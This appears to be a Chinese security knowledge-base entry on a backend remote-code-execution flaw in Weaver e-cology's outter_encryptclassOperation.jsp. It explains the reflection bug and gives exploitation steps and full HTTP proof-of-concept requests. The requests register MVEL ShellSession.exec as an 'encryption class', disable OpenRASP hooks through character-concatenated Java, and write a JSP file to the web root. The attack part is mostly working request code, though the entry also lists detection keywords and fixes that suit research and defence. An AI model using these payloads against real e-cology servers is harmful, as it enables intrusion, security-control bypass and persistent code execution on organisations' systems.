---
id: web-java-expression-mvel-weaver-outter-encryptclass-shellsession-rce
title: 泛微 e-cology 后台 outter_encryptclassOperation.jsp 反射调用 MVEL ShellSession.exec：RASP 绕过并写 JSP
type: scenario
domain: web
path: web/java/expression/mvel
technique: weaver-outter-encryptclass-shellsession-mvel-rce
tags:
- web
- java
- weaver
- ecology
- mvel
- shellsession
- rce
- rasp-bypass
- reflection
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V223
  verified_at: '2026-11-07T06:26:53+08:00'
  notes: 已对照原文32张图逐张核对（缺02/11/26/28与meta一致）：outter_encryptclassOperation.jsp operation=add 且 isdialog=0 时 datatype=0、insert outer_encryptclass、getOutterSysEncryptClassOperates 返回firstID=1、operation=test 按id取记录后 datatype!=1 走 Class.forName/newInstance/getMethod(String)/invoke、ShellSession.exec 按换行逐条执行、Util.fromScreen 转义导致 &lt;% 失效、字符拼接+OpenRASP setDisableHooks+hutool writeBytes 写 getaddr.jsp 并返回 Hello World 均与图文一致。未验证点：PoC未本机复跑；原文未标注具体受影响版本（Ecology9为环境），未设affected_versions；frontmatter无 sources/source_url。
url: /docs/web/java/expression/mvel/web-java-expression-mvel-weaver-outter-encryptclass-shellsession-rce/
draft: false
kb_aliases:
- 泛微后台 RCE
- outter_encryptclassOperation
- MVEL ShellSession.exec
- org.mvel2.sh.ShellSession
- RASP 绕过写 JSP
- OpenRASP setDisableHooks
---

## 一句话结论

泛微 e-cology 后台的 `/interface/outter/outter_encryptclassOperation.jsp` 允许把任意 `encryptclass`/`encryptmethod` 写入 `outer_encryptclass` 表，再以 `operation=test&id=<id>&plaintext=<代码>` 反射实例化该类并调用其 `String` 参数方法；写入 `org.mvel2.sh.ShellSession` 的 `exec` 即可执行任意 Java/MVEL 代码，配合 `String.valueOf((char)...)` 字符拼接与 `com.baidu.openrasp.config.Config.getConfig().setDisableHooks("true")` 绕过 RASP 后，可用 hutool `FileUtil.writeBytes` 向 Web 根写入 JSP。

## 原理

- **添加方法**：`outter_encryptclassOperation.jsp` 在 `operation=add` 时读取 `encryptclass`、`encryptmethod`、`decryptmethod`、`encryptname` 等参数；当 `isdialog=0` 时把 `datatype` 置为 `0`，随后 `insert into outer_encryptclass(...)` 把攻击者提供的类名/方法名写入数据库。
- **取回 ID**：`POST /api/integration/Outter/getOutterSysEncryptClassOperates` 查询 `outer_encryptclass order by id`，返回 `firstID`（原文为 `1`）；该命令检查 `intergration:outtersyssetting` 权限，但登录后台/绕过登录后即可调用。
- **反射执行**：再次请求 JSP，`operation=test`、`id=<firstID>`、`plaintext=<代码>`；服务端按 id 查询记录，`datatype != 1` 时进入 else 分支：
  `clazz = Class.forName(encryptclass); object = clazz.newInstance(); methodEncode = clazz.getMethod(encryptmethod, String.class); encryptStr = (String) methodEncode.invoke(object, plaintext);`
  即对任意类、任意 String 参数方法做反射调用。
- **MVEL ShellSession**：把 `encryptclass` 设为 `org.mvel2.sh.ShellSession`、`encryptmethod=exec`，`plaintext` 作为命令传给 `ShellSession.exec(String)`，按换行拆分并逐行执行，等价于任意 Java/MVEL 代码执行。
- **输入转义与 RASP**：`Util.fromScreen` 会转义 `<`、`>`、引号等字符，直接写 JSP 会失败；原文用 `String.valueOf((char)102)+...` 拼接字符串绕过关键字/引号过滤，并调用百度 OpenRASP 的 `Config.getConfig().setDisableHooks("true")` 关闭 Hook，再把 `fileNotAllowWrite*.*` 设为 `false`，最后用 `cn.hutool.core.io.FileUtil.writeBytes(new byte[]{...}, weaver.general.GCONST.getRootPath()+"getaddr.jsp")` 写入 JSP。
- 之所以成立：JSP 信任数据库中的类名/方法名并对其反射调用，而数据库内容可由同一后台接口写入；MVEL `ShellSession` 是功能完整的命令/表达式执行器；RASP 的 Hook 与写入限制可通过应用自身可访问的配置 API 关闭。

## 触发条件

- 目标为泛微 e-cology（文章基于 e-cology 9 环境，`outer_encryptclass` 表位于 `Ecology9` 库；未标注具体版本）。
- 攻击者拥有可访问 `/interface/outter/outter_encryptclassOperation.jsp` 的后台会话（可先通过前台登录绕过获得），或该接口存在未授权访问。
- `outer_encryptclass` 表可写；`/api/integration/Outter/getOutterSysEncryptClassOperates` 可用于取 ID。
- 目标 classpath 包含 MVEL（`org.mvel2.sh.ShellSession`）与 hutool（`cn.hutool.core.io.FileUtil`）；RASP 若存在，需可调用其配置类关闭 Hook。
- Web 根目录可写（`GCONST.getRootPath()`），或可写其它可解析目录。

## 利用步骤

1. 登录后台（或利用前台登录绕过获得会话）。
2. `operation=add` 写入 `encryptclass=org.mvel2.sh.ShellSession`、`encryptmethod=exec`、`decryptmethod=exec`、`encryptname=ttttaaa`、`isdialog=0`。
3. 调用 `/api/integration/Outter/getOutterSysEncryptClassOperates` 获取 `firstID`（如 1）。
4. `operation=test&id=<firstID>&plaintext=<构造代码>` 触发反射调用；先执行无害命令（如 `whoami`）验证。
5. 构造 RASP 绕过与写文件 payload：用 `String.valueOf((char)...)` 拼接 `fileNotAllowWrite*.*`、`true`、`getaddr.jsp` 等字符串，调用 `System.setProperty`、`Config.getConfig().setDisableHooks`，最后 `FileUtil.writeBytes(bytes, GCONST.getRootPath()+"getaddr.jsp")`。
6. 访问 `http://target/getaddr.jsp` 验证 JSP 执行（原文截图为 Hello World）。

## PoC

添加方法：

```http
POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
Host: <target>
Cookie: ecology_JSessionid=<admin-session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzxbkBUobimAjBCqg

------WebKitFormBoundaryzxbkBUobimAjBCqg
Content-Disposition: form-data; name="operation"

add
------WebKitFormBoundaryzxbkBUobimAjBCqg
Content-Disposition: form-data; name="encryptname"

ttttaaa
------WebKitFormBoundaryzxbkBUobimAjBCqg
Content-Disposition: form-data; name="encryptclass"

org.mvel2.sh.ShellSession
------WebKitFormBoundaryzxbkBUobimAjBCqg
Content-Disposition: form-data; name="encryptmethod"

exec
------WebKitFormBoundaryzxbkBUobimAjBCqg
Content-Disposition: form-data; name="decryptmethod"

exec
------WebKitFormBoundaryzxbkBUobimAjBCqg
Content-Disposition: form-data; name="isdialog"

0
------WebKitFormBoundaryzxbkBUobimAjBCqg
Content-Disposition: form-data; name="x";filename="x"

x
------WebKitFormBoundaryzxbkBUobimAjBCqg--
```

执行代码（原文 payload，使用字符拼接绕过转义；仅授权测试）：

```http
POST /interface/outter/outter_encryptclassOperation.jsp?a=1.swf HTTP/1.1
Host: <target>
Cookie: ecology_JSessionid=<admin-session>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYR9iikTLYE7wo7At

------WebKitFormBoundaryYR9iikTLYE7wo7At
Content-Disposition: form-data; name="operation"

test
------WebKitFormBoundaryYR9iikTLYE7wo7At
Content-Disposition: form-data; name="plaintext"

java.lang.System.setProperty(String.valueOf((char)102)+..., String.valueOf((char)102)+...);com.baidu.openrasp.config.Config.getConfig().setDisableHooks(String.valueOf((char)116)+...);a=weaver.general.GCONST.getRootPath()+String.valueOf((char)103)+...;cn.hutool.core.io.FileUtil.writeBytes(new byte[]{60,37,32,111,117,116,46,112,114,105,110,116,108,110,40,34,72,101,108,108,111,32,87,111,114,108,100,34,41,59,32,37,62},a);
------WebKitFormBoundaryYR9iikTLYE7wo7At
Content-Disposition: form-data; name="id"

1
------WebKitFormBoundaryYR9iikTLYE7wo7At
Content-Disposition: form-data; name="x";filename="x"

1
------WebKitFormBoundaryYR9iikTLYE7wo7At--
```

字节数组 `60,37,32,111,...` 对应 JSP 内容 `<% out.println("Hello World"); %>`。原文截图确认 `getaddr.jsp` 被写入并返回 Hello World；完整字符拼接 payload 见原文。

## 变体与关联

- 变体：`encryptclass` 可换成其它可执行类（如脚本引擎、命令执行工具类），`encryptmethod` 换成对应 String 参数方法；不限于 MVEL。
- 变体：RASP 绕过可换成其它 Hook 禁用/卸载、类加载隔离或字节码改写；核心是应用自身暴露了可关闭安全组件的配置 API。
- 关联：前台登录绕过（DWR/mToken/ImgFileDownload 链）后可进入后台触发本接口；也可结合其它后台文件上传/数据库写配置链。
- 同类：泛微 E10 testExecute1 Arthas OGNL RCE（不同版本/组件）、e-cology JDBC socketFactory 内存马（后台写配置链）。

## 检测与防御

- 修复：`outter_encryptclassOperation.jsp` 只允许预定义加解密类白名单，禁止 `Class.forName` 加载任意类；清空/限制 `outer_encryptclass` 表写入；对 `encryptclass`/`encryptmethod` 做严格枚举。
- 检测：向 `outer_encryptclass` 插入 `org.mvel2.sh.ShellSession` 等异常类名；`outter_encryptclassOperation.jsp` 的 `operation=test` 请求含 `ShellSession`、`Runtime`、`getRuntime`、`FileUtil`、`openrasp` 等关键字；Web 根新增 `.jsp` 文件；`getOutterSysEncryptClassOperates` 紧随 add 请求出现。
- 加固：升级/打补丁；删除不需要的 outter 集成功能；RASP 配置不可由应用自身关闭；Web 根目录只读/禁止脚本写入；最小权限运行。
